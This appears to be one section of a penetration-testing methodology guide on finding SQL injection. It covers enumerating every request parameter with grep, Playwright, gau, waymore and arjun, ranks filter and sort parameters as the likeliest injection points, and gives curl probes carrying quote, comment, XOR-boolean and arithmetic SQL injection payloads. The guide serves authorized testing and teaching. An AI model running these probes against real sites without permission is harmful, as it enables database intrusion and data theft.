# PART 4: Systematic Parameter Testing

### 4.1 Why Testing Only One Parameter Is Insufficient

In our failure, we tested only `keyword` on the main search. The page had **10+ parameters**: `colour`, `make`, `model`, `year`, `price`, `sortby`, `city`, `filter`, `dealerid`, `group_no`. The injectable parameter was `colour` -- a **filter parameter**, not the primary search.

**Rule**: EVERY parameter that reaches the database is a potential injection point. Filter/facet parameters are HIGHER priority because developers often secure the main search query but forget the filter queries.

### 4.2 How to Enumerate ALL Parameters

#### A. From HTML forms

```bash
# Extract all form fields
grep -oP 'name="[^"]+"' page.html | sort -u
grep -oP "name='[^']+'" page.html | sort -u

# Extract select/option values (filter dropdowns)
grep -oP '<select[^>]*name="([^"]+)"' page.html
grep -oP '<option[^>]*value="([^"]+)"' page.html

# Extract hidden inputs
grep -oP '<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"' page.html
```

#### B. From inline JavaScript (data objects, AJAX payloads)

```bash
# jQuery .ajax data objects
grep -oP "data\s*:\s*\{[^}]+\}" page.html *.js

# Form serialization
grep -oP "serialize\(\)" page.html *.js   # .serialize() means ALL form fields are sent
grep -oP "serializeArray\(\)" page.html *.js

# FormData construction
grep -oP "append\s*\(\s*['\"]([^'\"]+)['\"]" page.html *.js

# Hardcoded parameter names
grep -oP "['\"](?:action|filter|sort|page|limit|id|type|category|status|query|search|keyword|name|value|colour|color|make|model|year|price|city)['\"]" page.html *.js
```

#### C. From network traffic (Playwright / Burp)

```javascript
// Playwright: capture ALL POST bodies during page interaction
page.on('request', req => {
  if (req.method() === 'POST') {
    const body = req.postData();
    if (body) {
      console.log(`POST ${req.url()}: ${body}`);
      // Parse body to extract parameter names
      const params = new URLSearchParams(body);
      for (const [key, val] of params) {
        console.log(`  PARAM: ${key} = ${val}`);
      }
    }
  }
});
```

#### D. From Wayback / GAU historical URLs

```bash
# Historical parameters for the target
gau --subs TARGET 2>/dev/null | grep -oP '[?&]([a-zA-Z_]+)=' | sort | uniq -c | sort -rn
waymore -i TARGET -oU wayback_urls.txt
grep -oP '[?&]([a-zA-Z_]+)=' wayback_urls.txt | sort | uniq -c | sort -rn
```

#### E. Arjun parameter brute-force

```bash
# Brute-force hidden params on the endpoint
arjun -u "https://TARGET/endpoint" -m POST -d "action=handler_name" --include "X-Requested-With: XMLHttpRequest"
arjun -u "https://TARGET/endpoint" -m GET
```

### 4.3 Parameter Priority Ordering (Most Likely Injectable)

| Priority | Parameter Type | Why | Examples |
|----------|---------------|-----|----------|
| 1 | **Filter/facet parameters** | Often concatenated into WHERE clauses without parameterization | `colour`, `make`, `model`, `category`, `brand`, `price_min`, `price_max` |
| 2 | **Sort/order parameters** | ORDER BY injection, no quote needed | `sortby`, `order`, `sort_field`, `orderby`, `sort_dir` |
| 3 | **Search/query parameters** | LIKE clause injection | `keyword`, `search`, `query`, `q`, `term` |
| 4 | **ID parameters** | Direct integer injection in WHERE | `id`, `uid`, `product_id`, `user_id`, `item_id` |
| 5 | **Pagination parameters** | LIMIT/OFFSET injection | `page`, `limit`, `offset`, `per_page`, `start` |
| 6 | **Date/range parameters** | BETWEEN clause injection | `date_from`, `date_to`, `start_date`, `end_date` |
| 7 | **Hidden/internal parameters** | Often unvalidated backend params | `_nonce`, `group_no`, `dealer_id`, `region` |
| 8 | **File/path parameters** | LFI, but sometimes SQL-backed file lookup | `file`, `path`, `template`, `view` |

**KEY LESSON**: Test parameters in priority order. `colour` (Priority 1: filter) should have been tested BEFORE `keyword` (Priority 3: search).

### 4.4 Minimum Parameter Testing Protocol

For each parameter discovered:

```bash
# Step 1: Single quote test (MOST IMPORTANT)
# Does ' cause an error, different response, or 403?
curl -sk -d "param=VALUE'" -H "X-Requested-With: XMLHttpRequest" "URL" -o /dev/null -w "%{http_code} %{size_download}\n"

# If 200 with different size → INJECTION LIKELY (quote reaches DB)
# If 403 → WAF blocks quotes, try encoding
# If 500 → SQL error, injection confirmed
# If same as baseline → parameter may not be in SQL query

# Step 2: Comment test (confirm SQL context)
curl -sk -d "param=VALUE'--+-" -H "X-Requested-With: XMLHttpRequest" "URL"
curl -sk -d "param=VALUE'#" -H "X-Requested-With: XMLHttpRequest" "URL"
# If response returns to normal (matches no-quote baseline) → IN SQL CONTEXT

# Step 3: Boolean test with operators (not keywords)
curl -sk -d "param=VALUE'^(1=1)^'" -H "X-Requested-With: XMLHttpRequest" "URL"
curl -sk -d "param=VALUE'^(1=2)^'" -H "X-Requested-With: XMLHttpRequest" "URL"

# Step 4: Arithmetic test
curl -sk -d "param=VALUE'-(1=1)-'" -H "X-Requested-With: XMLHttpRequest" "URL"
curl -sk -d "param=VALUE'-(1=2)-'" -H "X-Requested-With: XMLHttpRequest" "URL"
```

---

